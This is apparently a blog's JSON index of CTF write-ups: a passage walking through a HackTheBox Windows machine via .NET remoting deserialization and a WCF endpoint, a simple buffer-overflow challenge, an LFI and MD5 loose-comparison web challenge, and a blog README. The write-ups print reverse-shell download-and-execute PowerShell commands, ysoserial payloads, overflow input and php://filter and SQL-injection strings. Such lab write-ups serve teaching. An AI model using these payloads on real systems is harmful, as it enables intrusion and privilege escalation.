Sun Nov 15 06:30:13 2020  ..                                  D        0  Sun Nov 15 06:30:13 2020  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020  notes.txt                           A       70  Sun Nov 15 08:59:02 2020  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020  # notes.txtTodo:    Migrate from .Net remoting to WCF	# This might be our hint    Add input validationTwo executables Client.exe and Server.exe, as well as their library, are also built in C#  so we can decompile them with dnSpy.Then we have a secret endpoint listening on port 8888 with its username and password hardcoded in Client.exeThe credentials are to be tested with CME whether they are valid.Credentials acquired            Username      Password      Status                  debug      SharpApplicationDebugUserPassword123!      Valid              Administrator      G2@$btRSHJYTarg      Invalid              lars      G123HHrth234gRG      Valid      Exploit local .NET debug serviceAs debug profile contains nothing but some useless folders (IPC$, dev and similarities for lars), we have to figure out how to connect to the endpoint on port 8888. Back to the notes.txt, I thought there is something to do with the .NET service and came across these two repos. You can take a look yourselves.https://github.com/tyranid/ExploitRemotingService  A tool to exploit .NET Remoting Services vulnerable to CVE-2014-1806 or CVE-2014-4149. It only works on Windows although some aspects might work in Mono on *nix.https://github.com/frohoff/ysoserial (basically our payload wrapper)  ysoserial is a collection of utilities and property-oriented programming “gadget chains” discovered in common java libraries that can, under the right conditions, exploit Java applications performing unsafe deserialization of objects. The main driver program takes a user-specified command and wraps it in the user-specified gadget chain, then serializes these objects to stdout. When an application with the required gadgets on the classpath unsafely deserializes this data, the chain will automatically be invoked and cause the command to be executed on the application hostWe will use ysoserial to wrap our reverse-tcp PowerShell one-liner1 and call ExploitRemotingService.exe to pipe our wrapped payload into the mentioned vulnerable endpoint.Payload crafting and Network configurationUseful PoC2 repositoriesBecause ExploitRemotingService doesn’t provide us any release versions so we have to download and build the project manually with Visual Studio on our Windows VM3.Additionally, I have to install NDesk Options library in order to successfully compile the solution.ysoserial has their portable version so we can simply download, unzip and use it.Here is a brief look of Server.exe source code decompiled by dnSpy. The server is running on port 8888 with BinaryFormatter sink implemented. You can read about the details here; simply put, we just need ysoserial to wrap our payload in BinaryFormatter mode.Below is our crafting steps with ysoserial and ExploitRemotingService:### ysoserial.exeC:\\Users\\User\\Desktop\\ysoserial-1.34\\Release&amp;gt;ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 -c &quot;powershell IEX(new-object net.webclient).downloadString(&#39;http://10.10.16.3/reverse.ps1&#39;)&quot;# Breakdown-f Formatter as BinaryFormatter-g TypeConfuseDelegate gadget-o Base64 output-c Create a reverse connection back to our IP using Powershell one-liner called reverse.ps1IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.16.3/reverse.ps1&#39;)### ExploitRemotingService.exeC:\\Users\\User\\Desktop\\ExploitRemotingService-master\\ExploitRemotingService\\bin\\Release&amp;gt;ExploitRemotingService.exe -s --user=debug --pass=&quot;SharpApplicationDebugUserPassword123!&quot; tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &amp;lt;wrapped payload&amp;gt;Network re-routing on Windows and LinuxBefore we can send our payload to target host, remember that currently our Linux machine is the only one can connect to HTB VPN, not our Windows. In order to establish a connection between Windows and HTB VPN, we have to do some routing.The following section helps us turn Kali into a router and act as the gateway.# Windows# We want to route any HTB connection to our Kali machine NAT-IPC:\\Windows\\system32&amp;gt;route add 10.10.10.0 mask 255.255.255.0 192.168.157.133 OK!#	----------------------------------------------# Linux# Enable IP Forwarding$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward # Configurate iptables&#39; rules to manage incomming packets# This rule forwards packets from HTB to our Windows machine# Breakdown: Forwarding chain for connection from tun0 to eth0 interface with related and/or established state$ iptables -A FORWARD -i tun0 -o eth0 -m state --state RELATED,ESTABLISHED -j ACCEPT # Accept packets sending back from Windows machine# Breakdown: Receive packets from Windows through eth0 interface then pass it on tun0 and send them to HTB$ iptables -A FORWARD -i eth0 -o tun0 -j ACCEPT# Re-routing NAT from HTB machine back to Windows# Breakdown: Create a NAT table with POSTROUTING chain that accept only IP from the source of eth0 and pass it through tun0 with MASQUERADE policy$ iptables -t nat -A POSTROUTING -s 192.168.157.0/24 -o tun0 -j MASQUERADE PowerShell Reverse ConnectionFinally, our Windows is able to send/receive packets from HTB machine through Kali.Now we can send our payload to target remote host and wait for our reverse shell.### ExploitRemotingService.exeC:\\Users\\User\\Desktop\\ExploitRemotingService-master\\ExploitRemotingService\\bin\\Release&amp;gt;ExploitRemotingService.exe -s --user=debug --pass=&quot;SharpApplicationDebugUserPassword123!&quot; tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw &amp;lt;wrapped payload&amp;gt;After execute the above command, we has established a reverse PowerShell as user lars.Browsing through lars directories, there is a wcf folder in Documents. This has also been mentioned in notes.txt about migrating the project from dotNET to WCF, so it might be the answer. Anyway, the machine’s user flag is located in C:\\Users\\lars\\Desktop\\user.txt.    Directory: C:\\Users\\lars\\Documents\\wcfMode                LastWriteTime         Length Name                                                                  ----                -------------         ------ ----                                                                  d-----       11/15/2020   1:40 PM                .vs                                                                   d-----       11/15/2020   1:40 PM                Client                                                                d-----       11/15/2020   1:40 PM                packages                                                              d-----       11/15/2020   1:40 PM                RemotingLibrary                                                       d-----       11/15/2020   1:41 PM                Server                                                                -a----       11/15/2020  12:47 PM           2095 wcf.sln                                                               PS C:\\Users\\lars\\Documents\\wcf&amp;gt; Let’s compress the wcf directory into wcf.zip then download it to our Linux shared directoryAnother secret endpoint and …flag!It turns out wcf.zip is also a C# project with source code inside, we can put it in Visual Studio and view the source. There is another secret endpoint that is currently running on port 8889 of the remote host.Since we are in the same network with remote target, you can try change the IP to the machine (10.10.10.219) and run the code. But there is a problem.We can’t connect to our target because of invalid credentials. This program was meant to run as internal users of the remote host (like lars or debug). To impersonate lars, we will run our command-prompt with his net-username as following:# Also type lars password when promptedC:\\Windows\\system32&amp;gt;runas /user:lars /netonly %ComSpec%Now we are lars in his server, move to our malformed wcf project and run it again.Successfully executed as lars. Now we will use the project’s built-in function InvokePowerShell to escalate our privilege.        public string InvokePowerShell(string scriptText)        {            Runspace runspace = RunspaceFactory.CreateRunspace();            runspace.Open();            Pipeline pipeline = runspace.CreatePipeline();            pipeline.Commands.AddScript(scriptText);            pipeline.Commands.Add(&quot;Out-String&quot;);            Collection &amp;lt;PSObject&amp;gt; results = pipeline.Invoke();            runspace.Close();            StringBuilder stringBuilder = new StringBuilder();            foreach (PSObject obj in results)            {                stringBuilder.AppendLine(obj.ToString());            }            return stringBuilder.ToString();        }    }Client.cs is to be changed as below:namespace Client {    public class Client    {        public static void Main() {            ChannelFactory&amp;lt;IWcfService&amp;gt; channelFactory = new ChannelFactory&amp;lt;IWcfService&amp;gt;(                new NetTcpBinding(SecurityMode.Transport),&quot;net.tcp://10.10.10.219:8889/wcf/NewSecretWcfEndpoint&quot;            );            IWcfService client = channelFactory.CreateChannel();            Console.WriteLine(client.InvokePowerShell(&quot;IEX(New-Object Net.WebClient).downloadString(&#39;10.10.16.3/reverse.ps1&#39;)&quot;));        }    }Re-build the project then execute Client.exe as lars gives us our reverse shell as nt-authority systemAnd the flag is located in C:\\Users\\Administrator\\Desktop\\root.txtcd C:\\Users\\Administratordir    Directory: C:\\Users\\AdministratorMode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   d-r---       11/12/2020   5:15 PM                3D Objects                                                             d-r---       11/12/2020   5:15 PM                Contacts                                                               d-r---       11/15/2020   1:42 PM                Desktop                                                                d-r---       11/15/2020   1:46 PM                Documents                                                              d-r---       11/12/2020   5:15 PM                Downloads                                                              d-r---       11/12/2020   5:15 PM                Favorites                                                              d-r---       11/12/2020   5:15 PM                Links                                                                  d-r---       11/12/2020   5:15 PM                Music                                                                  d-r---       11/12/2020   5:15 PM                Pictures                                                               d-r---       11/12/2020   5:15 PM                Saved Games                                                            d-r---       11/12/2020   5:15 PM                Searches                                                               d-r---       11/12/2020   5:15 PM                Videos                                                                 cd Desktopdir    Directory: C:\\Users\\Administrator\\DesktopMode                LastWriteTime         Length Name                                                                   ----                -------------         ------ ----                                                                   -ar---        5/14/2021   6:02 AM             34 root.txt                                                               cat root.txt[REDACTED]PS C:\\Users\\Administrator\\Desktop&amp;gt; Footnotes            See more about PowerShell one-liner: https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf &amp;#8617;              Proof of Concept &amp;#8617;              Virtual Machine &amp;#8617;      "
  },
  
  {
    "title": "KCSC - A simple BOF",
    "url": "/blog/en/posts/ez-bof/",
    "categories": "",
    "tags": "kma, reverse engineer, pwn",
    "date": "2021-02-24 03:45:00 +0800",
    





    "snippet": "Today we are going to test out Ghidra with one of my university pwnie challenge.            Info      Value                  Name      pwn1              SHA256      d3e77076e7c9c113e22d08ff1e266aad4070625fb9841f49451dc835b09bd799d243e24a064ba3e8b0f10d86f5d10b381942f6902343d614ee5cf401c4138fd3              Type      ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0              Entropy      3.82492 (not packed)      AnalyzingLet’s load the binary into our disassembler Ghidra and analyze the main function. Take your time to spot the problem in the following code.undefined4 main(void){  __uid_t __euid;  __uid_t __ruid;  char local_4c [40];  int local_24;  undefined *local_14;    local_14 = &amp;amp;stack0x00000004;  local_24 = 0;  setbuf(stdout,(char *)0x0);  setbuf(stdin,(char *)0x0);  setbuf(stderr,(char *)0x0);  puts(&quot;This should be an easy BOF!&quot;);  gets(local_4c);  if (local_24 == 0) {    puts(&quot;try again ma boi :v&quot;);  }  else {    puts(&quot;Good, now try harder&quot;);    if (local_24 == 0xbabebeef) {      __euid = geteuid();      __ruid = geteuid();      setreuid(__ruid,__euid);      puts(&quot;OK, submit the flag&quot;);      system(&quot;cat flag&quot;);    }  }  return 0;}BreakdownWe can see the variable local_24 is declared but never changed and thus the program’s flow will always result into if (local_24 == 0) statement, right? That’s when the buffer overflow jumps in as the gets is marked as deprecated and not safe to use.  MSDN:  Because there is no way to limit the number of characters read by gets, untrusted input can easily cause buffer overruns. Use fgets instead.As the explanation is said, that it’s impossible to tell how many characters gets will read into the buffer, here is local_4c with the length of 40 in character. Let’s try overflow it with a simple python script.┌──(kali㉿kali)-[~/CTF/KCSC/ez_bof]└─$ python3 -c &quot;print(&#39;a&#39;*41)&quot; | ./pwn1This should be an easy BOF!Good, now try harderGreat, we are able to get through the first block. In the next conditional statement, we can achieve the flag whether the comparison between local_24 and 0xbabebeef is equal. We can just simply modify the local_24 value to 0xbabebeef.As we have known that the buffer is holding 40 characters in size, the leftover ones are being passed onto the next stack address which is now local_24’s address. So we will fill the buffer local_4c with 40 characters and then put 0xbabebeef value into local_24.┌──(kali㉿kali)-[~/CTF/KCSC/ez_bof]└─$ python3 -c &quot;print(&#39;a&#39;*40 + &#39;\\xef\\xbe\\xbe\\xba&#39;)&quot; | ./pwn1This should be an easy BOF!Good, now try harderOK, submit the flagKCSC{[REDACTED]}"
  },
  
  {
    "title": "KCSC - LFI/RFI Wrapper",
    "url": "/blog/en/posts/RFI-Wrapper/",
    "categories": "",
    "tags": "kma, web-pentest",
    "date": "2021-02-24 03:45:00 +0800",
    





    "snippet": "This is the first iteration of my CTF write-up series for the new year. Today we will be solving one of my university’s initial challenges. The task is simple itself but I want to show you the mindset of how I play the game.FingerprintingManual testingThe absolute first thing I do when encountering any web challenge, is to actually visit the webpage and click on everything, fill out every text boxes. Just for a few minutes, get a feeling of mechanics and how the website might operate. Looking at various functionality is the key to do web-pentest.The login page is shown as we follow our given URL, which is http://p2n.000webhostapp.com/log_me_in/index.php?page=loginPretty much simple. Let’s try some universal input into those fields and see what the return is.username: adminpassword: adminThe result is expected, a single text line informing invalid credentials. Next we will put a quote (&#39;) into one of the field to check whether or not adhere to malformed input.username: &#39;password: adminBut it still returns the same error line so we can assume that the form is somewhat safe from common bypassing technique.It also worth mentioning that you should try different types of input such as:admin&#39; --admin&#39; #admin&#39;/*admin&#39; or &#39;1&#39;=&#39;1...Automation testingHost informationNext step is to enumerate the server type and ports. We all know in our current challenge that this step is insignificant but we can never know for sure, especially while dealing with real-life situations as this will help you determine which attack method to use, where and when to put the payload, etc.So let us fire up our favorite tool of all time in automated enumeration, nmap.nmap -v -A --os-guess p2n.000webhostapp.comBasically, above command will provide us with how many ports are currently open and what type of OS the server is using....PORT      STATE    SERVICE22/tcp    filtered ssh80/tcp    open     http443/tcp   open     https873/tcp   filtered rsync2020/tcp  filtered xinupageserver2049/tcp  open     nfs8080/tcp  open     http-proxy9100/tcp  filtered jetdirect9101/tcp  filtered jetdirect32768/tcp open     filenet-tms...Device type: general purpose|storage-misc|WAPRunning (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (89%), HP embedded (87%), OpenBSD 4.X (86%), FreeBSD 12.X|11.X (86%)OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:openbsd:openbsd:4.3 cpe:/o:freebsd:freebsd:12.0 cpe:/o:freebsd:freebsd:11.1 cpe:/o:linux:linux_kernel:2.4Aggressive OS guesses: Linux 3.10 - 4.11 (89%), Linux 4.10 (89%), Linux 4.4 (89%), Linux 3.13 or 4.2 (88%), HP P2000 G3 NAS device (87%), OpenWrt Kamikaze 7.09 (Linux 2.6.22) (86%), OpenBSD 4.3 (86%), FreeBSD 12.0-RELEASE (86%), Linux 3.18 (86%), Linux 3.16 (85%)No exact OS matches for host (test conditions non-ideal).Now we can see that the server is running on Linux-based OS. Using this we can keep going on enumerating those service ports but I will just put it here as we will discuss more about probing in our later posts.In-depth analysisNow we want to pay a close attention to the given URLhttp://p2n.000webhostapp.com/log_me_in/index.php?page=loginThe variable page here looks pretty suspicious since its role is to act as a navigation controller. What to do here is to try assigning some value for page.http://p2n.000webhostapp.com/log_me_in/index.php?page=abcOf course, it would be like this. The web server takes the abc value and then adds the .php extension after it.This is the result of page=flagAfter all, we are able to know that the endpoint has access to following objects:index.phplogin.phpflag.phpAnd we come to the conclusion about this endpoint is simply  a LFI/RFI gold-mine for us to abuse as the value of page is not being sanitized at all.In case you are not aware of LFI/RFI, you can read about it here.Since the webpage standard is not to include PHP objects as plain code, we have to wrap it up using any encoding types (base64). So our final payload would be as follow:http://p2n.000webhostapp.com/log_me_in/index.php?page=php://filter/convert.base64-encode/resource=index.phpUsing Burp Suite to prettify the output:Decode the base64 buffer will let us have the PHP source of index.php&amp;lt;?phpif (isset($_GET[&#39;page&#39;])) {	$page = $_GET[&#39;page&#39;];		if (preg_match(&quot;/flag/i&quot;, $page))		die(&quot;&amp;lt;h1&amp;gt;Not so ez =))). Let&#39;s think another way!!! &amp;lt;/h1&amp;gt;&quot;);	include($_GET[&#39;page&#39;].&#39;.php&#39;);}else {	header(&#39;Location: ?page=login&#39;);}?&amp;gt;Do the same with login.php and grab the source&amp;lt;?phpinclude(&quot;flag.php&quot;);if (isset($_POST[&#39;usr&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;pwd&#39;]) ) {	$your_username = $_POST[&#39;usr&#39;];	$your_password = $_POST[&#39;pwd&#39;];	if ($your_username === &quot;admin&quot; &amp;amp;&amp;amp; md5($your_password) == md5(&quot;NOOPCJF&quot;) &amp;amp;&amp;amp; $your_password !== &quot;NOOPCJF&quot; )		echo &quot;Hello admin!! Here your flag: &quot;.$flag;	else		die(&quot;Something went wrong!!!&quot;);}?&amp;gt;&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html lang=&quot;en&quot;&amp;gt;&amp;lt;head&amp;gt;	&amp;lt;meta charset=&quot;UTF-8&quot;&amp;gt;	&amp;lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&amp;gt;	&amp;lt;title&amp;gt;Login page&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;	&amp;lt;h1&amp;gt;Login form&amp;lt;/h1&amp;gt;	&amp;lt;form action=&quot;?page=login&quot; method=&quot;POST&quot;&amp;gt;		&amp;lt;label for=&quot;usr&quot;&amp;gt; Username &amp;lt;/label&amp;gt;		&amp;lt;input type=&quot;text&quot; name=&quot;usr&quot; required /&amp;gt; &amp;lt;br&amp;gt;		&amp;lt;label for=&quot;pwd&quot;&amp;gt; Password &amp;lt;/label&amp;gt;		&amp;lt;input type=&quot;text&quot; name=&quot;pwd&quot; required /&amp;gt; &amp;lt;br&amp;gt;		&amp;lt;input type=&quot;submit&quot; value=&quot;submit&quot;&amp;gt;	&amp;lt;/form&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;Now we want to look at the IF statement as it provides us the valid credentials to achieve our flag	if ($your_username === &quot;admin&quot; &amp;amp;&amp;amp; md5($your_password) == md5(&quot;NOOPCJF&quot;) &amp;amp;&amp;amp; $your_password !== &quot;NOOPCJF&quot; )		echo &quot;Hello admin!! Here your flag: &quot;.$flag;	else		die(&quot;Something went wrong!!!&quot;);The username is clearly admin but the password part is a little tricky as it might seems the correct one is NOOPCJF but the following statement is telling otherwise.But there is a significant vulnerability here as the comparison between two hashes is using loose == operator.The MD5 hash of NOOPCJF is 0e818888003657176127862245791911. This is not actually a valid MD5 since it starts with \\x0e and with the loose comparison operator, it will result in 0. So all you have to do is to find a MD5 string that also starts with \\x0e. In this case, we will use 240610708 (0e462097431906509019562988736854) as our password.Username: adminPassword: 240610708And the flag is KCSC{gu7_ch0p_3m_hjhjhjhj!!!}ConclusionSo that is it for today write-up, thank you and I hope you can learn something from this. Feel free to share it to your friends."
  },
  
  {
    "title": "A README.md",
    "url": "/blog/en/posts/README/",
    "categories": "Thoughts",
    "tags": "thoughts",
    "date": "2020-11-24 04:51:22 +0800",
    





    "snippet": "Welcome to my personal blog where I can share to people my thoughts and experience about (mostly) technology, research articles and sometimes irrelevant stuff.Topics on this blog are mainly about cyber research, school projects, club tasks or CTF write-ups. I will try to keep the blog updated regularly, one or two posts a week depend on my real life workload.As some of you have already known that it is not my first blog. The reason I created this new one is to improve my English and keeping thing a little bit more professional. I decided that the writing style on this blog will contain concise, research-like materials so you may find it difficult to understand all of the posts, especially my Vietnamese fellows. Please noted that I don’t want to use any fancy, magic words or try to confuse the readers. The context is still the same, but it will be interpreted in a more academic way.I know a lot of people cannot handle the long, visually unstimulating wall-of-text, so do I. In future posts, many more galleries, formats will be added to make particular topics more interesting and less drowsy for readers.Another story which is worth mentioning, now I completely abandoned Medium since Github and Jekyll are doing a great job making blog easier and more customizable. Then why we have to make it harder for ourselves, right? I agree that it is complicated at first but when you are used to it, everything’s changed.This is the end of the README on this blog. Have a good day!"
  }
  
]

